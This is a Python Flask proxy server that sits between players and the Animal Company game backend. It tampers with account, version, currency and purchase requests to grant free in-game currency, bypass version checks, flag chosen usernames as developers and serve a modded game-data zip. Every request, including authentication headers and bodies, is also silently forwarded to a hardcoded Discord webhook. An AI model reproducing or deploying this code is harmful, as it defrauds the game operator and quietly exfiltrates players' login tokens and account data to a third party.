import json
import os
import requests
from flask import Flask, request, Response, jsonify

# hi skire thanks for the path shit
app = Flask(__name__)
session = requests.Session()

animalcompAPI = 'https://animalcompany.us-east1.nakamacloud.io'
Version = "1.26.1.1394"  # zombies: "1.26.1.1394" | lava update: "1.17.3.1153"
IdkWhatTheFuckTsis = "MetaQuest_1.17.3.1153_96d6b8b7"  # zombies: "MetaQuest_1.26.1.1394_0698af8b"
ProdZipFile = "https://github.com/FreakyUnity/moddedanimalcompany/raw/refs/heads/main/game-data-prod.zip"
GameDataProd = "https://github.com/FreakyUnity/moddedanimalcompany/tree/main/game-data-prod"
PhotonAppId = "88b85ae7-68c2-408b-8afd-99401475ef7c"
PhotonVoiceAppId = "71e8ae24-3b8a-425f-918a-0534450545e6"
HardCurrency = 50000
SoftCurrency = 9000000
ResearchPoints = 50000
Webhook = "https://discord.com/api/webhooks/1396924742409392128/LkoywoXgtMkdwhIO8ICHPelB2ToEevofduoitdLufd4n4gtvm04v-SHselerKjHO7GQa"

def discrddddd(path, method, headers, params, body):
    try:
        embed = {
            "title": "TEST",
            "fields": [
                {"name": "Path", "value": f"`{path}`", "inline": False},
                {"name": "Method", "value": f"`{method}`", "inline": True},
                {"name": "Headers", "value": f"```json\n{json.dumps(headers, indent=2)}```", "inline": False},
                {"name": "Params", "value": f"```json\n{json.dumps(params, indent=2)}```", "inline": False},
                {"name": "Body", "value": f"```json\n{body}```", "inline": False},
            ],
            "color": 0x000000
        }
        requests.post(Webhook, json={"embeds": [embed]}, timeout=2)
    except:
        pass


@app.route('/', defaults={'path': ''}, methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
@app.route('/<path:path>', methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
def catch_all(path):
    try:
        method = request.method
        headers = dict(request.headers)
        params = request.args
        data = request.get_data()

        AnimalCompanyAPI = f"{animalcompAPI}/{path}"

        discrddddd(
            path=path,
            method=method,
            headers=headers,
            params=params.to_dict(),
            body=data.decode("utf-8", errors="ignore")
        )

        if path == "v2/account/authenticate/custom":
            b = json.loads(data)
            if isinstance(b, dict) and 'vars' in b:
                b['vars']['clientUserAgent'] = IdkWhatTheFuckTsis
            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)

        elif path == "v2/account":
            b = json.loads(data)
            if isinstance(b, dict):
                b['clientUserAgent'] = IdkWhatTheFuckTsis
                b['vars'] = Version
                b['SoftCurrency'] = SoftCurrency
                b['HardCurrency'] = HardCurrency
                b['researchPoints'] = ResearchPoints

                if 'Username' in b and isinstance(b['Username'], dict) and 'DisplayName' in b['Username']:
                    if b['Username']['DisplayName'] in ["iruss882", "iKDO.19"]:
                        b['isDeveloper'] = True
                        b['Username']['DisplayName'] = "<color=black>ur mom</color>"
                    else:
                        b['Username']['DisplayName'] = "MoonCompany" + b['Username']['DisplayName']

            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)

        elif path in ["version", "v2/version"]:
            b = json.loads(data)
            if isinstance(b, dict):
                b.update({
                    'version': Version,
                    'clientVersion': Version,
                    'gameVersion': Version,
                    'forceUpdate': False,
                    'clientUserAgent': IdkWhatTheFuckTsis
                })
            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)

        elif path == "v2/rpc/mining.balance":
            b = json.loads(data)
            if isinstance(b, dict):
                b['HardCurrency'] = HardCurrency
                b['researchPoints'] = ResearchPoints
            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)

        elif path == "v2/rpc/purchase.avatarItems":
            b = json.loads(data)
            if isinstance(b, dict):
                b['true'] = True
                b['none'] = False
            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)

        elif path == "v2/rpc/clientBootstrap":
            b = json.loads(data)
            if isinstance(b, dict):
                b.update({
                    'version': Version,
                    'clientVersion': Version,
                    'gameVersion': Version,
                    'minVersion': Version,
                    'requiredVersion': Version,
                    'gameDataURL': ProdZipFile,
                    'PhotonAppId': PhotonAppId,
                    'PhotonVoiceAppId': PhotonVoiceAppId
                })
            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=json.dumps(b), params=params)

        else:
            resp = session.request(method, AnimalCompanyAPI, headers=headers, data=data, params=params)

        if 'application/json' in resp.headers.get('Content-Type', ''):
            return jsonify(resp.json()), resp.status_code

        return Response(resp.content, status=resp.status_code, headers=dict(resp.headers))

    except Exception as e:
        return f"Internal Server Error: {str(e)}", 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 7000))
    app.run(host="0.0.0.0", port=port)
